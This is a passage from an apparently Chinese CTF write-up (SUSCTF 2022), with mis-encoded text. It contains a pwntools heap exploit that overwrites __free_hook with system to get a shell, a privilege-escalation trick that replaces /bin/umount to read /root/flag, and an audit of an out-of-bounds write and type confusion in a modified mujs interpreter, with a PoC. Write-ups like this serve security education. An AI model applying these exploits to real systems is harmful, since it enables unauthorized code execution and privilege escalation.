</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;data:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;data:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;12&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(sh,&#39;b * $rebase(0x10AA)&#39;)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span><span class=s1>&#39;aaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=mh>0xd7</span> <span class=o>-</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span><span class=s1>&#39;11111112&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=mh>0xd7</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3EBCA0</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base = &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf2</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf7</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf6</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf4</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf5</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf0</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf1</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mh>0xf2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span><span class=s1>&#39;9&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mh>0xf5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># delete(0xf0)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mh>0xf7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(sh,&#39;b * $rebase(0xF0F)&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># add(3,&#39;a&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xef</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xee</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xed</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xec</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=kqueue>kqueue</h2><h3 id=éé¢„æœŸ-1>éé¢„æœŸ</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=line><span class=cl>/ $ ls -al
</span></span><span class=line><span class=cl>drwxrwxr-x   <span class=m>14</span> ctf      ctf              <span class=m>0</span> Feb <span class=m>27</span> 11:54 .
</span></span><span class=line><span class=cl>drwxrwxr-x   <span class=m>14</span> ctf      ctf              <span class=m>0</span> Feb <span class=m>27</span> 11:54 ..
</span></span></code></pre></td></tr></table></div></div><p>æƒé™æ²¡é…å¥½,æ ¹ç›®å½•ctfæƒé™,ç›´æ¥éé¢„æœŸ
<code>exp</code>å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=line><span class=cl>mv bin bin1
</span></span><span class=line><span class=cl>/bin1/mkdir bin
</span></span><span class=line><span class=cl>/bin1/chmod <span class=m>777</span> bin
</span></span><span class=line><span class=cl>/bin1/echo <span class=s2>&#34;/bin1/cat /root/flag&#34;</span> &gt; /bin/umount
</span></span><span class=line><span class=cl>/bin1/chmod <span class=m>777</span> /bin/umount
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=kqueues-revenge>kqueue&rsquo;s revenge</h2><p>diffäº†ä¸€ä¸‹ç›´æ¥æœ‰flag
<img src=/img/2022-2-28-SUSCTF/20220301005626084.jpg alt=img></p><h2 id=mujs>mujs</h2><h3 id=é¢˜ç›®æè¿°>é¢˜ç›®æè¿°</h3><p>å‡ºé¢˜äººç»™å‡ºçš„é¢˜ç›®æè¿°å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ASN.1 data-lang=ASN.1><span class=line><span class=cl>dd0a0972b4428771e6a3887da2210c7c9dd40f9c  
</span></span><span class=line><span class=cl>nc 124.71.182.21 9999
</span></span></code></pre></td></tr></table></div></div><p>åœ¨é™„ä»¶ä¸­æœ‰<code>mujs</code>çš„æºç ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªåœ¨åµŒå…¥å¼è®¾å¤‡ä¸Šå¸¸ç”¨çš„jsä»£ç è§£é‡Šå™¨ã€‚è¿™ä¸ªæºç çš„ä»£ç é‡è¿˜æ˜¯å¾ˆå¤§çš„ã€‚åŒæ—¶é™„ä»¶é‡Œè¿˜æœ‰ä¸€ä¸ªç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»¥åŠlibcæ–‡ä»¶ã€‚ä»libcæ–‡ä»¶å¯ä»¥å¾—çŸ¥è¿œç¨‹çš„è¿è¡Œç¯å¢ƒæ˜¯libc.2.31</p><p>é¢˜ç›®æè¿°ä¸­ç»™å‡ºçš„è¿™ä¸ªhashå­—ç¬¦å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªæºç æ˜¯æ¥è‡ªäºè¿™ä¸ªhashå¯¹åº”çš„commitçš„<code>mujs</code>æºç </p><p><a href=https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c>https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c</a></p><p>æ‰€ä»¥ä½¿ç”¨diffå¯¹æ¯”äº†è¿™ä¸¤ä¸ªæºç ã€‚å‘ç°ä¸»è¦çš„å·®åˆ«åœ¨ä¸¤ä¸ªåœ°æ–¹</p><ul><li>ä¸€äº›å†…ç½®æ–¹æ³•åœ¨main.cä¸­è¢«ç¦ç”¨äº†</li><li>æ–°å¢äº†dataview.cæ–‡ä»¶ã€‚ è¿™ä¸ªæ˜¯<a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView>DataView</a> æ–¹æ³•çš„ä¸€ä¸ªç®€åŒ–ç‰ˆçš„å®ç°</li></ul><h3 id=å¯»æ‰¾æ¼æ´ç‚¹>å¯»æ‰¾æ¼æ´ç‚¹</h3><p>é˜Ÿå‹çš„æ€è·¯é¦–å…ˆæ˜¯ä»æœ€è¿‘çš„CVEé‡Œå¯»æ‰¾ä¸€äº›æ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜åº”è¯¥æ˜¯é­”æ”¹çš„è¿™ä¸ªç‰ˆæœ¬çš„æºç ã€‚è€Œä¸”è¢«é­”æ”¹çš„éƒ¨åˆ†å…¶å®ä»£ç é‡ä¸ç®—å¤§ï¼Œç›´æ¥å®¡å°±å¥½äº†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç†è§£DataViewéƒ½åšäº†ä»€ä¹ˆï¼Œéƒ½æœ‰å“ªäº›æ–¹æ³•ã€‚ä¸€äº›å¸¸ç”¨çš„ç”¨æ³•å¦‚ä¸‹æ‰€ç¤ºã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>x</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>getUint8</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>getUint8</span><span class=p>(</span><span class=mi>9</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>getUint8</span><span class=p>(</span><span class=mi>12</span><span class=p>))</span> <span class=c1>// should not work
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>print</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>setUint32</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></td></tr></table></div></div><p>å…¶å®ä»<code>jsB_initdataview</code>å‡½æ•°å½“ä¸­å¤§æ¦‚å¯ä»¥çœ‹å‡ºæ¥éƒ½æœ‰å“ªäº›æ–¹æ³•ï¼Œç„¶åè‡ªå·±è¯•ä¸€ä¸‹å°±å¯ä»¥è¯•å‡ºæ¥è¿™äº›æ–¹æ³•æ€ä¹ˆç”¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>void</span> <span class=nx>jsB_initdataview</span><span class=p>(</span><span class=nx>js_State</span> <span class=o>*</span><span class=nx>J</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>js_pushobject</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=nx>J</span><span class=o>-&gt;</span><span class=nx>DataView_prototype</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.getUint8&#34;</span><span class=p>,</span> <span class=nx>Dv_getUint8</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.setUint8&#34;</span><span class=p>,</span> <span class=nx>Dv_setUint8</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.getUint16&#34;</span><span class=p>,</span> <span class=nx>Dv_getUint16</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.setUint16&#34;</span><span class=p>,</span> <span class=nx>Dv_setUint16</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.getUint32&#34;</span><span class=p>,</span> <span class=nx>Dv_getUint32</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.setUint32&#34;</span><span class=p>,</span> <span class=nx>Dv_setUint32</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>jsB_propf</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView.prototype.getLength&#34;</span><span class=p>,</span> <span class=nx>Dv_getLength</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>js_newcconstructor</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=nx>jsB_new_DataView</span><span class=p>,</span> <span class=nx>jsB_new_DataView</span><span class=p>,</span> <span class=s2>&#34;DataView&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nx>js_defglobal</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;DataView&#34;</span><span class=p>,</span> <span class=nx>JS_DONTENUM</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åç»è¿‡ä¸€é˜µå®¡è®¡ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¶Šç•Œå†™æ“ä½œï¼Œå¯ä»¥è¶Šç•Œå†™9å­—èŠ‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>static</span> <span class=k>void</span> <span class=nx>Dv_setUint8</span><span class=p>(</span><span class=nx>js_State</span> <span class=o>*</span><span class=nx>J</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>js_Object</span> <span class=o>*</span><span class=nx>self</span> <span class=o>=</span> <span class=nx>js_toobject</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>self</span><span class=o>-&gt;</span><span class=nx>type</span> <span class=o>!=</span> <span class=nx>JS_CDATAVIEW</span><span class=p>)</span> <span class=nx>js_typeerror</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;not an DataView&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nx>size_t</span> <span class=nx>index</span> <span class=o>=</span> <span class=nx>js_tonumber</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nx>uint8_t</span> <span class=nx>value</span> <span class=o>=</span> <span class=nx>js_tonumber</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>index</span> <span class=o>&lt;</span> <span class=nx>self</span><span class=o>-&gt;</span><span class=nx>u</span><span class=p>.</span><span class=nx>dataview</span><span class=p>.</span><span class=nx>length</span><span class=o>+</span><span class=mh>0x9</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>self</span><span class=o>-&gt;</span><span class=nx>u</span><span class=p>.</span><span class=nx>dataview</span><span class=p>.</span><span class=nx>data</span><span class=p>[</span><span class=nx>index</span><span class=p>]</span> <span class=o>=</span> <span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>js_error</span><span class=p>(</span><span class=nx>J</span><span class=p>,</span> <span class=s2>&#34;out of bounds access on DataView&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡ŒåŒæ—¶ä¹Ÿå­˜åœ¨ä¸€ä¸ªæ•´æ•°æº¢å‡ºï¼ˆä½†æ˜¯æ˜¯æ— ç¬¦å·çš„)ï¼Œå¯ä»¥è®©æˆ‘ä»¬å¯ä»¥å‰æº¢9å­—èŠ‚ã€‚ä½†æ˜¯ç”±äºè¿™é‡Œæ²¡æœ‰ä»€ä¹ˆfreeçš„æ“ä½œï¼Œæ‰€ä»¥å¾ˆéš¾åˆ©ç”¨ã€‚å› æ­¤è¿˜æ˜¯åæº¢9å­—èŠ‚å¯ç”¨æ€§é«˜ä¸€ç‚¹ã€‚</p><h3 id=åˆ©ç”¨æ¼æ´>åˆ©ç”¨æ¼æ´</h3><h4 id=ç±»å‹æ··æ·†>ç±»å‹æ··æ·†</h4><p>å› ä¸ºè¯´æº¢å‡º9å­—èŠ‚ï¼Œè¿™ä¸ªå¤šå‡ºçš„ä¸€å­—èŠ‚å¾ˆå®¹æ˜“ä»¤äººè”æƒ³åˆ°ç±»å‹æ··æ·†ã€‚ä¸‹é¢æ˜¯ js_Object çš„ç»“æ„ã€‚å¯è§åªè¦æº¢å‡ºä¸€å­—èŠ‚å°±å¯ä»¥è¦†ç›–å®ƒçš„typeå­—æ®µã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>js_Object</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>enum</span> <span class=n>js_Class</span> <span class=n>type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>extensible</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>js_Property</span> <span class=o>*</span><span class=n>properties</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸‹é¢ç»™å‡ºç±»å‹æ··æ·†çš„poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x68</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>a</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>c</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span> <span class=c1>// change type of c to something
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è¾“å‡ºä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>[</span><span class=nx>object</span> <span class=nx>DataView</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>object</span> <span class=nb>String</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=è¶Šç•Œå†™dataviewçš„lengthå­—æ®µ>è¶Šç•Œå†™Dataviewçš„Lengthå­—æ®µ</h4><p>js_Objec ä½¿ç”¨äº† Cè¯­è¨€é‡Œçš„unionç»“æ„ï¼Œæ‰€ä»¥ä¸åŒç±»å‹å¯ä»¥å…±ç”¨ç›¸åŒçš„å†…å­˜ã€‚é˜Ÿå‹çš„æƒ³æ³•æ˜¯åˆ©ç”¨ä¸DataViewé‡ŒLengthå­—æ®µå ç”¨å†…å­˜ç›¸åŒçš„å…¶ä»–ç±»å‹çš„å­—ç¬¦æ¥ä¿®æ”¹DataLengthã€‚<strong>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰©å¤§ä»»æ„åœ°å€è¯»å†™çš„èŒƒå›´ï¼Œèµ·ç å¯ä»¥æ‹“å±•åˆ°æ•´ä¸ªå †ä¸Šäº†ï¼Œè€Œä¸ä»…ä»…æ˜¯è¶Šç•Œ9å­—èŠ‚ã€‚</strong></p><p>æ•´ä¸ªJs_Objec ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>js_Object</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
